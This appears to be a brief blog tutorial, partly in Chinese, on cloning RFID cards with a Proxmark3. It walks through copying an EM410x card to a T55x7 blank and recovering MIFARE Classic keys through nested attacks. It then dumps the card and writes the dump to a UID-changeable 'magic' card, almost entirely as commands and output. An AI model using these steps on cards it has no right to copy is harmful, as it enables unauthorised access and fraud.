---
layout: post 
title: How to clone RFID cards 如何复制RFID卡
tags:
- rfid
---

Tool used: Proxmark3 with [野马无疆PM3 Proxmark3 RFID ICID读卡 全加密](https://item.taobao.com/item.htm?spm=a230r.7195193.1997079397.9.hb2yGL&id=556716910562&abbucket=9)
useful links:
 - https://github.com/Proxmark/proxmark3/wiki/commands
 - https://zhuanlan.zhihu.com/p/29661557
 - http://www.proxmark.org/forum/viewtopic.php?id=2554

## How to clone a low frequence (125KHZ) RFID card
```
proxmark3> lf search
Reading 30000 bytes from device memory

Data fetched
Samples @ 8 bits/smpl, decimation 1:1
NOTE: some demods output possible binary
  if it finds something that looks like a tag
False Positives ARE possible


Checking for known tags:

EM410x pattern found:

EM TAG ID      : ***********
Unique TAG ID  : ***********

Valid EM410x ID Found!

proxmark3> lf em em410xwrite <EM TAG ID> 1
Writing T55x7 tag with UID 0x*********** (clock rate: 64)
#db# Started writing T55x7 tag ...
#db# Clock rate: 64
#db# Tag T55x7 written with 0xff82345234

```

## How to clone a high frequence card
```
proxmark3> hf search

 UID : xx xx xx xx
ATQA : xx xx
 SAK : xx [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
Answers to chinese magic backdoor commands: NO

Valid ISO14443A Tag Found - Quiting Search

proxmark3> hf mf mifare
...
parity is all zero,try special attack!just wait for few more seconds...
Found valid key:ffffffffffff 

proxmark3> hf mf nested 1 0 A ffffffffffff d
Testing known keys. Sector count=16
nested...
-----------------------------------------------
Iterations count: 0


|---|----------------|---|----------------|---|
|sec|key A           |res|key B           |res|
|---|----------------|---|----------------|---|
|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|---|----------------|---|----------------|---|
Printing keys to binary file dumpkeys.bin...

proxmark3> hf mf dump 1
...
Successfully read block  2 of sector 15.
#db# READ BLOCK FINISHED       
Successfully read block  3 of sector 15.
Dumped 64 blocks (1024 bytes) to file dumpdata.bin

proxmark3> script run dumptoemul.lua

# with blank UID card
proxmark3> hf mf cload <uid>
Loaded from file: <uid>.eml
```

### reset UID 

```
Usage:  hf mf csetuid <UID 8 hex symbols> <w>
sample:  hf mf csetuid 01020304 w
Set block data for magic Chinese card (only works with!!!)
If you want wipe card then add 'w' into command lin
copied from: http://www.proxmark.org/forum/viewtopic.php?id=2015
```
